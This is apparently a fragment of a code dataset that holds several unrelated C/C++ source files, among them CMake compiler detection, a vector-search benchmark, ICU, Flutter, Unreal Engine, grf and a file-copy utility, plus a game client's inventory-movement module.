defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include <gtest/gtest.h>\n#include <omp.h>\n\n#include <algorithm>\n#include <boost/dynamic_bitset.hpp>\n#include <boost/program_options.hpp>\n#include <chrono>\n#include <cmath>\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <vector>\n#include <filesystem>\n\n#include \"efanna2e/distance.h\"\n#include \"efanna2e/neighbor.h\"\n#include \"efanna2e/parameters.h\"\n#include \"efanna2e/util.h\"\n#include \"index_bipartite.h\"\n\nnamespace po = boost::program_options;\n\nfloat ComputeRecall(uint32_t q_num, uint32_t k, uint32_t gt_dim, uint32_t *res, uint32_t *gt) {\n    uint32_t total_count = 0;\n    for (uint32_t i = 0; i < q_num; i++) {\n        std::vector<uint32_t> one_gt(gt + i * gt_dim, gt + i * gt_dim + k);\n        std::vector<uint32_t> intersection;\n        std::vector<uint32_t> temp_res(res + i * k, res + i * k + k);\n        for (auto p : one_gt) {\n            if (std::find(temp_res.begin(), temp_res.end(), p) != temp_res.end()) intersection.push_back(p);\n        }\n\n        total_count += static_cast<uint32_t>(intersection.size());\n    }\n    return static_cast<float>(total_count) / (float)(k * q_num);\n}\n\ndouble ComputeRderr(float* gt_dist, uint32_t gt_dim, std::vector<std::vector<float>>& res_dists, uint32_t k, efanna2e::Metric metric) {\n    double total_err = 0;\n    uint32_t q_num = res_dists.size();\n\n    for (uint32_t i = 0; i < q_num; i++) {\n        std::vector<float> one_gt(gt_dist + i * gt_dim, gt_dist + i * gt_dim + k);\n        std::vector<float> temp_res(res_dists[i].begin(), res_dists[i].end());\n        if (metric == efanna2e::INNER_PRODUCT) {\n            for (size_t j = 0; j < k; ++j) {\n                temp_res[j] = -1.0 * temp_res[j];\n            }\n        } else if (metric == efanna2e::COSINE) {\n            for (size_t j = 0; j < k; ++j) {\n                temp_res[j] = 2.0 * ( 1.0 - (-1.0 * temp_res[j]));\n            }\n        }\n        double err = 0.0;\n        for (uint32_t j = 0; j < k; j++) {\n            err += std::fabs(temp_res[j] - one_gt[j]) / double(one_gt[j]);\n        }\n        err = err / static_cast<double>(k);\n        total_err = total_err + err;\n    }\n    return total_err / static_cast<double>(q_num);\n}\n\nint main(int argc, char **argv) {\n    std::string base_data_file;\n    std::string query_file;\n    std::string sampled_query_data_file;\n    std::string gt_file;\n\n    std::string bipartite_index_save_file, projection_index_save_file;\n    std::string data_type;\n    std::string dist;\n    std::vector<uint32_t> L_vec;\n    // uint32_t L_pq;\n    uint32_t num_threads;\n    uint32_t k;\n    std::string evaluation_save_path = \"\";\n\n    po::options_description desc{\"Arguments\"};\n    try {\n        desc.add_options()(\"help,h\", \"Print information on arguments\");\n        desc.add_options()(\"data_type\", po::value<std::string>(&data_type)->required(), \"data type <int8/uint8/float>\");\n        desc.add_options()(\"dist\", po::value<std::string>(&dist)->required(), \"distance function <l2/ip>\");\n        desc.add_options()(\"base_data_path\", po::value<std::string>(&base_data_file)->required(),\n                           \"Input data file in bin format\");\n        // desc.add_options()(\"sampled_query_data_path\", po::value<std::string>(&sampled_query_data_file)->required(),\n        //                    \"Sampled query file in bin format\");\n        desc.add_options()(\"query_path\", po::value<std::string>(&query_file)->required(), \"Query file in bin format\");\n        desc.add_options()(\"gt_path\", po::value<std::string>(&gt_file)->required(), \"Groundtruth file in bin format\");\n        // desc.add_options()(\"query_data_path\",\n        //                    po::value<std::string>(&query_data_file)->required(),\n        //                    \"Query file in bin format\");\n        // desc.add_options()(\"bipartite_index_save_path\", po::value<std::string>(&bipartite_index_save_file)->required(),\n        //                    \"Path prefix for saving bipartite index file components\");\n        desc.add_options()(\"projection_index_save_path\",\n                           po::value<std::string>(&projection_index_save_file)->required(),\n                           \"Path prefix for saving projetion index file components\");\n        desc.add_options()(\"L_pq\", po::value<std::vector<uint32_t>>(&L_vec)->multitoken()->required(),\n                           \"Priority queue length for searching\");\n        desc.add_options()(\"k\", po::value<uint32_t>(&k)->default_value(1)->required(), \"k nearest neighbors\");\n        desc.add_options()(\"evaluation_save_path\", po::value<std::string>(&evaluation_save_path),\n                           \"Path prefix for saving evaluation results\");\n        desc.add_options()(\"num_threads,T\", po::value<uint32_t>(&num_threads)->default_value(omp_get_num_procs()),\n                           \"Number of threads used for building index (defaults to \"\n                           \"omp_get_num_procs())\");\n\n        po::variables_map vm;\n        po::store(po::parse_command_line(argc, argv, desc), vm);\n        if (vm.count(\"help\")) {\n       ",
    "// \u00a9 2016 and later: Unicode, Inc. and others.\n// License & terms of use: http://www.unicode.org/copyright.html\n/*\n******************************************************************************\n* Copyright (C) 2015, International Business Machines\n* Corporation and others.  All Rights Reserved.\n******************************************************************************\n* sharedobject.cpp\n*/\n#include \"sharedobject.h\"\n#include \"mutex.h\"\n#include \"uassert.h\"\n#include \"umutex.h\"\n#include \"unifiedcache.h\"\n\nU_NAMESPACE_BEGIN\n\nSharedObject::~SharedObject() {}\n\nUnifiedCacheBase::~UnifiedCacheBase() {}\n\nvoid\nSharedObject::addRef() const {\n    umtx_atomic_inc(&hardRefCount);\n}\n\n// removeRef Decrement the reference count and delete if it is zero.\n//           Note that SharedObjects with a non-null cachePtr are owned by the\n//           unified cache, and the cache will be responsible for the actual deletion.\n//           The deletion could be as soon as immediately following the\n//           update to the reference count, if another thread is running\n//           a cache eviction cycle concurrently.\n//           NO ACCESS TO *this PERMITTED AFTER REFERENCE COUNT == 0 for cached objects.\n//           THE OBJECT MAY ALREADY BE GONE.\nvoid\nSharedObject::removeRef() const {\n    const UnifiedCacheBase *cache = this->cachePtr;\n    int32_t updatedRefCount = umtx_atomic_dec(&hardRefCount);\n    U_ASSERT(updatedRefCount >= 0);\n    if (updatedRefCount == 0) {\n        if (cache) {\n            cache->handleUnreferencedObject();\n        } else {\n            delete this;\n        }\n    }\n}\n\n\nint32_t\nSharedObject::getRefCount() const {\n    return umtx_loadAcquire(hardRefCount);\n}\n\nvoid\nSharedObject::deleteIfZeroRefCount() const {\n    if (this->cachePtr == nullptr && getRefCount() == 0) {\n        delete this;\n    }\n}\n\nU_NAMESPACE_END\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"Combat/Components/MeleeWeaponTraceComponent.h\"\n#include \"Kismet/KismetSystemLibrary.h\"\n#include \"Logs/RapidLog.h\"\n\nstatic int32 GDisplayAttackHitDetectionDebug = 0;\nstatic FAutoConsoleVariableRef CVarDisplayMeleeWeaponTraceDebug(\n\tTEXT(\"Rapid.DisplayMeleeWeaponTraceDebug\"),\n\tGDisplayAttackHitDetectionDebug,\n\tTEXT(\"Display debug traces for melee attack hit detection (0 - disabled. 1 - enabled)\"),\n\tECVF_Cheat);\n\nUMeleeWeaponTraceComponent::UMeleeWeaponTraceComponent()\n{\n\tPrimaryComponentTick.bCanEverTick = true;\n}\n\nvoid UMeleeWeaponTraceComponent::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tif (AActor* Owner = GetOwner())\n\t{\n\t\tAddActorToIgnore(Owner);\n\n\t\tCollisionMeshComponent = Owner->GetComponentByClass<USkeletalMeshComponent>();\n\t}\n}\n\nvoid UMeleeWeaponTraceComponent::TickComponent(float DeltaTime, ELevelTick TickType,\n                                               FActorComponentTickFunction* ThisTickFunction)\n{\n\tSuper::TickComponent(DeltaTime, TickType, ThisTickFunction);\n\n\tif (!bIsEnabled) return;\n\n\tCollisionTrace();\n}\n\n\nvoid UMeleeWeaponTraceComponent::EnableCollision()\n{\n\tClearHitActors();\n\n\tbIsEnabled = true;\n}\n\nvoid UMeleeWeaponTraceComponent::DisableCollision()\n{\n\tbIsEnabled = false;\n}\n\nvoid UMeleeWeaponTraceComponent::CollisionTrace()\n{\n\tif (!CollisionMeshComponent)\n\t{\n\t\tUE_LOG(RapidCombatLog, Warning, TEXT(\"Can't find MeshComponent for MeleeWeaponTraceComponent. Owner : %s\"),\n\t\t       *GetOwner()->GetName())\n\t}\n\n\tconst FVector StartLocation = CollisionMeshComponent->GetSocketLocation(StartSocketName);\n\tconst FVector EndLocation = CollisionMeshComponent->GetSocketLocation(EndSocketName);\n\n\tTArray<TEnumAsByte<EObjectTypeQuery>> ObjectTypes;\n\tObjectTypes.Add(UEngineTypes::ConvertToObjectType(ECC_Pawn));\n\n\tTArray<FHitResult> HitResults;\n\n\tUKismetSystemLibrary::SphereTraceMultiForObjects(GetWorld(), StartLocation, EndLocation, Radius, ObjectTypes, false,\n\t                                                 ActorsToIgnore, GDisplayAttackHitDetectionDebug\n\t\t                                                                 ? EDrawDebugTrace::ForDuration\n\t\t                                                                 : EDrawDebugTrace::None, HitResults, true,\n\t                                                 FColor::Green, FColor::Red, 0.1);\n\tfor (FHitResult HitResult : HitResults)\n\t{\n\t\tLastHitResult = HitResult;\n\n\t\tif (AlreadyHitActors.Contains(HitResult.GetActor()))\n\t\t\tcontinue;\n\n\t\tAlreadyHitActors.Add(HitResult.GetActor());\n\n\t\t//OnActorHit.Broadcast(HitResult);\n\t}\n}\n\nvoid UMeleeWeaponTraceComponent::ClearHitActors()\n{\n\tAlreadyHitActors.Empty();\n}\n\nvoid UMeleeWeaponTraceComponent::AddActorToIgnore(AActor* Actor)\n{\n\tActorsToIgnore.AddUnique(Actor);\n}\n\nvoid UMeleeWeaponTraceComponent::RemoveActorToIgnore(AActor* Actor)\n{\n\tActorsToIgnore.Remove(Actor);\n}\n",
    "/*-------------------------------------------------------------------------------\n  This file is part of generalized random forest (grf).\n\n  grf is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  grf is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with grf. If not, see <http://www.gnu.org/licenses/>.\n #-------------------------------------------------------------------------------*/\n\n#include <Rcpp.h>\n\n#include \"commons/Data.h\"\n#include \"forest/ForestOptions.h\"\n#include \"RcppUtilities.h\"\n\nusing namespace grf;\n\nRcpp::List RcppUtilities::create_forest_object(Forest& forest,\n                                               const std::vector<Prediction>& predictions) {\n  Rcpp::List result = serialize_forest(forest);\n  if (!predictions.empty()) {\n    add_predictions(result, predictions);\n  }\n  return result;\n}\n\nForest RcppUtilities::deserialize_forest(const Rcpp::List& forest_object) {\n  size_t ci_group_size = forest_object[\"_ci_group_size\"];\n  size_t num_variables = forest_object[\"_num_variables\"];\n\n  size_t num_trees = forest_object[\"_num_trees\"];\n  std::vector<std::unique_ptr<Tree>> trees;\n  trees.reserve(num_trees);\n\n  Rcpp::List root_nodes = forest_object[\"_root_nodes\"];\n  Rcpp::List child_nodes = forest_object[\"_child_nodes\"];\n  Rcpp::List leaf_samples = forest_object[\"_leaf_samples\"];\n  Rcpp::List split_vars = forest_object[\"_split_vars\"];\n  Rcpp::List split_values = forest_object[\"_split_values\"];\n  Rcpp::List drawn_samples = forest_object[\"_drawn_samples\"];\n  Rcpp::List send_missing_left = forest_object[\"_send_missing_left\"];\n\n  Rcpp::List prediction_values = forest_object[\"_pv_values\"];\n  size_t num_types = forest_object[\"_pv_num_types\"];\n\n  for (size_t t = 0; t < num_trees; t++) {\n    trees.emplace_back(new Tree(\n                         root_nodes.at(t),\n                         child_nodes.at(t),\n                         leaf_samples.at(t),\n                         split_vars.at(t),\n                         split_values.at(t),\n                         drawn_samples.at(t),\n                         send_missing_left.at(t),\n                         PredictionValues(prediction_values.at(t), num_types)));\n  }\n\n  return Forest(trees, num_variables, ci_group_size);\n}\n\nRcpp::List RcppUtilities::serialize_forest(Forest& forest) {\n  Rcpp::List result;\n\n  result.push_back(forest.get_ci_group_size(), \"_ci_group_size\");\n  result.push_back(forest.get_num_variables(), \"_num_variables\");\n\n  size_t num_trees = forest.get_trees().size();\n  result.push_back(num_trees, \"_num_trees\");\n\n  Rcpp::List root_nodes(num_trees);\n  Rcpp::List child_nodes(num_trees);\n  Rcpp::List leaf_samples(num_trees);\n  Rcpp::List split_vars(num_trees);\n  Rcpp::List split_values(num_trees);\n  Rcpp::List drawn_samples(num_trees);\n  Rcpp::List send_missing_left(num_trees);\n  Rcpp::List prediction_values(num_trees);\n  size_t num_types = 0;\n\n  for (size_t t = 0; t < num_trees; t++) {\n    // Destructively iterate over the forest by moving the unique_ptr to each tree.\n    std::unique_ptr<Tree> tree = std::move(forest.get_trees_().at(t));\n    root_nodes[t] = tree->get_root_node();\n    child_nodes[t] = tree->get_child_nodes();\n    leaf_samples[t] = tree->get_leaf_samples();\n    split_vars[t] = tree->get_split_vars();\n    split_values[t] = tree->get_split_values();\n    drawn_samples[t] = tree->get_drawn_samples();\n    send_missing_left[t] = tree->get_send_missing_left();\n\n    prediction_values[t] = tree->get_prediction_values().get_all_values();\n    num_types = tree->get_prediction_values().get_num_types();\n  }\n\n  result.push_back(root_nodes, \"_root_nodes\");\n  result.push_back(child_nodes, \"_child_nodes\");\n  result.push_back(leaf_samples, \"_leaf_samples\");\n  result.push_back(split_vars, \"_split_vars\");\n  result.push_back(split_values, \"_split_values\");\n  result.push_back(drawn_samples, \"_drawn_samples\");\n  result.push_back(send_missing_left, \"_send_missing_left\");\n  result.push_back(prediction_values, \"_pv_values\");\n  result.push_back(num_types, \"_pv_num_types\");\n  return result;\n};\n\nData RcppUtilities::convert_data(const Rcpp::NumericMatrix& input_data) {\n  return Data(input_data.begin(), input_data.nrow(), input_data.ncol());\n}\n\nRcpp::List RcppUtilities::create_prediction_object(const std::vector<Prediction>& predictions) {\n  Rcpp::List result;\n  add_predictions(result, predictions);\n  return result;\n};\n\nvoid RcppUtilities::add_predictions(Rcpp::List& output,\n                                    const std::vector<Prediction>& predictions) {\n  output.push_back(RcppUtilities::create_prediction_matrix(predictions), \"predicti",
    "#include \"../include/copyOperator.h\"\n\nvoid FileCopyOperator::showVersion(void)\n{\n    printSplitLine(45, '-');\n    WARNING_LOG(\"Software version: \" + SOFTWARE_VERSION + '\\n'); \n    printSplitLine(45, '-');\n\n}\n\nvoid FileCopyOperator::showHelp(void)\n{\n    printSplitLine(65, '-');\n\n    loger(\n            std::clog, NOTIFY,\n            \"Usage:\\n\",\n            \"mycp --help     Get help info.\\n\",\n            \"mycp --version  Get version.\\n\",\n            \"mycp [sorce file] [target path] Copy sorce file to target path.\\n\"\n        );\n\n    printSplitLine(65, '-');\n}\n\nvoid FileCopyOperator::forwardBackwardSwitch(std::string & __path)\n{\n    /*\n        \u82e5\u5728 __srcFile \u4e2d\u6ca1\u6709\u627e\u5230 / \u6216 \\ \u5b57\u7b26\uff0c\n        \u5219\u4ee3\u8868\u5b83\u53ef\u80fd\u662f\u4e00\u4e2a\u7eaf\u6587\u4ef6\uff0c\u6216\u8005\u975e\u6cd5\u5b57\u7b26\u4e32\uff0c\u76f4\u63a5\u539f\u8def\u8fd4\u56de\u5c31\u597d\u3002\n    */\n    if ((__path.find('/') == __path.npos) && (__path.find('\\\\') == __path.npos)) { return; }\n\n    std::replace(__path.begin(), __path.end(), '/', OS_SPECIFIC_SLASH);\n    std::replace(__path.begin(), __path.end(), '\\\\', OS_SPECIFIC_SLASH);\n}\n\nstd::string FileCopyOperator::getFileType(const std::string & __srcFile)\n{\n    /*\u83b7\u53d6 . \u5b57\u7b26\u7b2c\u4e00\u6b21\u51fa\u73b0\u5728\u5b57\u7b26\u4e32 __srcFile \u4e2d\u7684\u4f4d\u7f6e\u3002*/\n    std::size_t dotPos = __srcFile.find('.');\n\n    /*\u5728\u786e\u4fdd\u5b57\u7b26\u4e32 __srcFile \u6709 . \u5b57\u7b26\u7684\u60c5\u51b5\u4e0b */\n    if (dotPos != __srcFile.npos)\n    {\n        /*\u5206\u5272 . \u5b57\u7b26\u540e\u9762\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5e76\u8fd4\u56de*/\n        return __srcFile.substr(dotPos + 1);\n    }\n    else { return \"\"; } // \u5728 __srcFile \u627e\u4e0d\u5230 . \u5b57\u7b26\u5c31\u8fd4\u56de\u7a7a\u5b57\u7b26\n}\n\nstd::string FileCopyOperator::getFileName(const std::string & __srcFile)\n{\n    // \u67e5\u627e\u6700\u540e\u4e00\u4e2a '/' \u6216 '\\' \uff08\u7531\u4e8e\u5df2\u4f7f\u7528 forwardBackwardSwitch \u7edf\u4e00\u8fc7\uff0c\u6b64\u5904\u53ef\u53ea\u67e5\u627e '/'\n    std::size_t pathPos = __srcFile.rfind(OS_SPECIFIC_SLASH);\n\n    // \u82e5\u627e\u4e0d\u5230 '/'\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n    if (pathPos == std::string::npos) { return \"\"; }\n\n    // \u5206\u5272\u6700\u540e\u4e00\u4e2a '/' \u540e\u9762\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5e76\u8fd4\u56de\n    return __srcFile.substr(pathPos + 1);\n}\n\nvoid FileCopyOperator::copyFile(std::string __srcFile, std::string __tarPath)\n{\n    /*\u5c06\u4f20\u5165\u7684\u8def\u5f84\u5b57\u7b26\u4e32\u7684\u659c\u6760\u671d\u5411\u5168\u90e8\u6539\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u89c4\u8303\u7684\u659c\u6760*/\n    this->forwardBackwardSwitch(__srcFile);\n    this->forwardBackwardSwitch(__tarPath);\n\n    /*\u7531\u4e8e\u53ef\u80fd\u4f20\u5165\u7684\u975e\u6cd5\u5b57\u7b26\uff0c\u6240\u4ee5\u9700\u8981\u6709\u5f02\u5e38\u673a\u5236*/\n    try\n    {\n        /*\u6253\u5f00\u8981\u88ab\u590d\u5236\u7684\u6587\u4ef6*/\n        this->readFStream.open(__srcFile, std::ios_base::binary);\n\n        if (!this->readFStream.is_open()) \n        { \n            throw std::runtime_error(__srcFile + \" is not exist!\\n\");\n        }\n\n        /*\n            \u5c06\u8981\u88ab\u590d\u5236\u7684\u6587\u4ef6\u548c\u8981\u88ab\u590d\u5236\u5230\u7684\u8def\u5f84\u7ec4\u6210\u65b0\u7684\u6587\u4ef6\u8def\u5f84\uff0c\n            \u5982 ./data/The_Art_of_Patience.txt \u6216 .\\data\\The_Art_of_Patience.txt\n        */\n       std::string targetFile;\n        if (*(__tarPath.end() - 1) == OS_SPECIFIC_SLASH)\n        {\n            targetFile = (__tarPath + this->getFileName(__srcFile));\n        }\n        else \n        {\n            targetFile = (__tarPath + OS_SPECIFIC_SLASH + this->getFileName(__srcFile));\n        }\n\n        loger(\n                std::cout, NOTIFY,\n                \"Copy [\", __srcFile, \"] to [\", targetFile, \"]\\n\"\n        );\n\n        /*\u6253\u5f00 \u6216 \u521b\u5efa\uff08\u5728\u76ee\u6807\u6587\u4ef6\u4e0d\u5b58\u5728\u7684\u60c5\u51b5\u4e0b\uff09targetFile*/\n        this->writeFstream.open(targetFile, std::ios_base::out | std::ios_base::binary);\n\n        if (!this->writeFstream.is_open())\n        {\n            throw std::runtime_error(\"Failed to open the target file: \" + targetFile + '\\n');\n        }\n\n        /*\u5f53\u6ca1\u6709\u8bfb\u5230\u6e90\u6587\u4ef6\u672b\u5c3e\u65f6*/\n        while (!this->readFStream.eof())\n        {\n            /*\u4ece\u6e90\u6587\u4ef6\u6316 bufferSize \u5b57\u8282\u7684\u6570\u636e\u5230 byteBuffer*/\n            readFStream.read(reinterpret_cast<char *>(&this->byteBuffer), BUFFER_SIZE);\n\n            // \u786e\u5b9a\u4e00\u5171\u8bfb\u4e86\u591a\u5c11\u5b57\u8282\u7684\u6570\u636e\uff0c\u907f\u514d\u6587\u4ef6\u672c\u8eab\u6bd4\u7f13\u51b2\u533a\u8fd8\u5c0f\u7684\u60c5\u51b5\u3002\n            std::streamsize bytesRead = readFStream.gcount();\n\n            /*\u628a\u7f13\u51b2\u533a\u5185\u7684\u6570\u636e\u5168\u90e8\u5199\u5165\u76ee\u6807\u6587\u4ef6*/\n            writeFstream.write(reinterpret_cast<char *>(&this->byteBuffer), bytesRead);\n\n            /*\u5199\u5165\u5b57\u8282\u6570\u7d2f\u52a0*/\n            this->sourceFileByteCount += bytesRead;\n\n            if (readFStream.eof()) { break; }\n        }\n\n        loger(\n                std::cout, NOTIFY,\n                \"Size of [\", this->getFileName(__srcFile), \"] = \", \n                (double)this->sourceFileByteCount / 1024, \" KBytes.\\n\"\n        );\n    }\n    catch (const std::exception & __except)\n    {\n        ERROR_LOG(__except.what());\n    }\n}\n\nFileCopyOperator::~FileCopyOperator()\n{\n    this->readFStream.clear();\n    this->writeFstream.clear();\n    this->readFStream.close();\n    this->writeFstream.close();\n}",
    "#include \"InventoryMove.h\"\n\nInventoryMove::InventoryMove() : IModule(0, Category::MOVEMENT, \"Move even when you have your inventory open.\") {\n}\n\nInventoryMove::~InventoryMove() {\n}\n\nconst char* InventoryMove::getModuleName() {\n\treturn \"InvMove\";\n}\n\nvoid InventoryMove::onTick(GameMode* gm) {\n\tif (Game.getLocalPlayer()->canOpenContainerScreen())\n\t\treturn;\n\tGameSettingsInput* input = Game.getClientInstance()->getGameSettingsInput();\n\n\tif (input == nullptr)\n\t\treturn;\n\n\tfloat speed = 0.325f;\n\tfloat yaw = gm->player->getActorHeadRotationComponent()->rot.y;\n\n\tif (GameData::isKeyDown(*input->spaceBarKey) && gm->player->isOnGround()) {\n\t\tgm->player->jumpFromGround();\n\t}\n\n\tbool isForwardKeyDown = GameData::isKeyDown(*input->forwardKey);\n\tbool isBackKeyDown = GameData::isKeyDown(*input->backKey);\n\tbool isRightKeyDown = GameData::isKeyDown(*input->rightKey);\n\tbool isLeftKeyDown = GameData::isKeyDown(*input->leftKey);\n\n\tif (isForwardKeyDown && isBackKeyDown) {\n\t\treturn;\n\t} else if (isForwardKeyDown) {\n\t\tkeyPressed = true;\n\n\t\tif (isRightKeyDown && !isLeftKeyDown) {\n\t\t\tyaw += 45.f;\n\t\t} else if (isLeftKeyDown && !isRightKeyDown) {\n\t\t\tyaw -= 45.f;\n\t\t}\n\t} else if (isBackKeyDown) {\n\t\tkeyPressed = true;\n\n\t\tif (isRightKeyDown && !isLeftKeyDown) {\n\t\t\tyaw += 135.f;\n\t\t} else if (isLeftKeyDown && !isRightKeyDown) {\n\t\t\tyaw -= 135.f;\n\t\t} else {\n\t\t\tyaw += 180.f;\n\t\t}\n\t} else if (isRightKeyDown && !isLeftKeyDown) {\n\t\tkeyPressed = true;\n\t\tyaw += 90.f;\n\t} else if (isLeftKeyDown && !isRightKeyDown) {\n\t\tkeyPressed = true;\n\t\tyaw -= 90.f;\n\t}\n\tif (yaw >= 180)\n\t\tyaw -= 360.f;\n\n\tfloat calcYaw = (yaw + 90) * (PI / 180);\n\t//float calcPitch = (gm->player->pitch) * -(PI / 180);\n\tVec3 moveVec;\n\tmoveVec.x = cos(calcYaw) * speed;\n\tmoveVec.y = gm->player->entityLocation->velocity.y;\n\tmoveVec.z = sin(calcYaw) * speed;\n\tif (keyPressed) {\n\t\tgm->player->lerpMotion(moveVec);\n\t\tkeyPressed = false;\n\t}\n}\n",
